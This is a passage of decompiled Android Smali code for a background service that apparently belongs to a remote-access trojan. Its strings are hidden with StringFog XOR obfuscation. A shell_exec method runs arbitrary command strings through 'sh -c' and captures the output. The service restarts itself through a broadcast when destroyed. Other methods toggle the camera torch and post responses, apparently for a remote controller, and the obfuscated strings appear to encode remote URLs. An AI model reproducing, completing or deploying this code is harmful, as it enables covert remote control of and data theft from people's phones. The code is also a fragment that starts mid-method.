    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aSc2TFZr"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "eg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "JiQnQwZp"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "eg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "NyEyWVc7ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTAvWxg2OCdeS2hzNkxWMDhhEw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "eg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "MT0wEw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 669
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    .line 645
    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto/16 :goto_0

    .line 654
    :pswitch_1
    const-string v0, "PDokQkA="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 655
    const-string v0, "PSAyXUtve2lLUScxJExLMCcyQko0MyMDXzo7IUFdNCQvXhY2OysCTmV7JAJPPT0ySBVnNiUYXns1Nl1LJTsyA1s6OWlCFzw6JEJAeyQoSgc0ODIQVTAwL0weITstSFZoMnVOXm0wfhwVNjJ0HhVhYX4VFTcwf04VM20lHg8zYXcVAWBn"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    .line 658
    :pswitch_2
    const-string v0, "JjEoWQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 659
    const-string v0, "PSAyXUtve2lLUScxJExLMCcyQko0MyMDXzo7IUFdNCQvXhY2OysCTmV7JAJPPT0ySBVnNiUYXns1Nl1LJTsyA1s6OWlCFyYxKFkWJTohElk5IHtAXTE9JwtMOj8jQwU0YSBPCmxtdQANYzZwAAwzYHIAWjRtcwANbGxzTF02YidJDDQ="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    .line 662
    :pswitch_3
    const-string v0, "OiEyT1ct"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 663
    const-string v0, "PSAyXUtve2lLUScxJExLMCcyQko0MyMDXzo7IUFdNCQvXhY2OysCTmV7JAJPPT0ySBVnNiUYXns1Nl1LJTsyA1s6OWlCFzohMk9XLXo2Q19qNSpZBTgxIkRZcyApRl07aXRLD2VickwPeGRzTwB4YHMeDXg1cE5eeGJwGw40MXQdWjMydg=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    :catch_0
    move-exception v0

    goto/16 :goto_1

    .line 695
    :catch_1
    move-exception v0

    goto/16 :goto_1

    .line 652
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_1
        :pswitch_2
        :pswitch_0
        :pswitch_3
    .end packed-switch
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 1124
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    .prologue
    .line 150
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 151
    invoke-direct {p0}, Lsigma/male/servicess;->initialize()V

    .line 152
    invoke-direct {p0}, Lsigma/male/servicess;->initializeLogic()V

    .line 156
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 1131
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 1132
    const-string v1, "JzE1WVknIDVISiM9JUg="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 1133
    const-class v1, Lsigma/male/restarter;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 1134
    invoke-virtual {p0, v0}, Lsigma/male/servicess;->sendBroadcast(Landroid/content/Intent;)V

    .line 1136
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 1138
    return-void
.end method

.method public shell_exec(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    .prologue
    .line 905
    const-string v0, ""

    .line 909
    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "Jjw="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x1

    const-string v3, "eDc="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x2

    aput-object p1, v1, v2

    .line 912
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 913
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {v1}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 915
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_0

    .line 919
    :goto_1
    return-object v0

    .line 915
    :cond_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    goto :goto_0

    .line 916
    :catch_0
    move-exception v0

    const-string v0, "MCY0Qko="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_1
.end method

.method public tofft()V
    .locals 6

    .prologue
    .line 1106
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "ASE0Q10xdAlLXnUAKV9bPXQqRF89IA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 1108
    const-string v0, "NjUrSEo0"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/servicess;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/camera2/CameraManager;

    .line 1110
    :try_start_0
    invoke-virtual {v0}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aget-object v1, v1, v2

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/hardware/camera2/CameraManager;->setTorchMode(Ljava/lang/String;Z)V
    :try_end_0
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_0 .. :try_end_0} :catch_0

    .line 1112
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public tont()V
    .locals 6

    .prologue
    .line 1114
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "ASE0Q10xdAlDGAE7NE5QdTgvSlAh"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 1117
    const-string v0, "NjUrSEo0"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/servicess;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/camera2/CameraManager;

    .line 1119
    :try_start_0
    invoke-virtual {v0}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aget-object v1, v1, v2

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/hardware/camera2/CameraManager;->setTorchMode(Ljava/lang/String;Z)V
    :try_end_0
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_0 .. :try_end_0} :catch_0

    .line 1120
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method
